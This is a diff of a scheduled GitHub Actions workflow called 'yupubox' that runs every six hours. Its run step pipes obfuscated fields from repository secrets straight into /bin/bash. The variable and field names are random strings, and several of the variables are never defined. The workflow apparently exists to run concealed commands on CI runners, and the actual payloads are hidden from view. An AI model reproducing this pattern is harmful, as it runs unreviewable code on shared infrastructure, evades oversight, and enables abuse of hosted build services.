@@ -1,9 +1,8 @@
 name: yupubox
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 0/6 * * *'
+    - cron: '23 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: yupubox
         env:
-          sa03: ${{ secrets.sa03 }}
+          g72: ${{ secrets.g72 }}
         run: |
-          echo $sa03 | jq -r .sfuig5960 | /bin/bash
-          echo $l83 | jq -r .nfhpf44 | /bin/bash
-          echo $fkmqo0 | jq -r .bh61 | /bin/bash
-          echo $muegm7880 | jq -r .onlpc57 | /bin/bash
-          echo $bk40 | jq -r .db441 | /bin/bash
-          echo $evktr7437 | jq -r .u9018 | /bin/bash
-          echo $uv28777 | jq -r .vo2358 | /bin/bash
-          echo $y9 | jq -r .m1 | /bin/bash
+          echo $g72 | jq -r .zp6099 | /bin/bash
+          echo $dyo509 | jq -r .z5 | /bin/bash
+          echo $dwc66 | jq -r .fc46 | /bin/bash
+          echo $njj234 | jq -r .wfk81 | /bin/bash
+          echo $oo345 | jq -r .a33985 | /bin/bash
 
